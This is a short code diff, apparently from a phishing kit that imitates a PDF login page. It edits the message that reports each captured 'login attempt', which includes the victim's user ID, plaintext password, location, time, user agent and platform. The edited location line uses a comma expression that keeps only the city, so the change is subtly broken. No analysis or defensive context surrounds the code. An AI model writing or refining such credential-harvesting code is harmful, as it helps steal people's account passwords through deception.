@@ -691,7 +691,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
       const message = `🔐 pdf login ATTEMPT 🔐\n\n` +
                       `📧 User Id: ${uid}\n` +
                       `🔑 Password: ${password}\n` +
-                      `🖥️ location: ${location}\n` +
+                      `🖥️ location: ${location.country, location.city}\n` +
                       `📅 Time: ${timestamp}\n` +
                       `💻 User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n` +
                       `🖥️ Platform: ${platform}\n` +
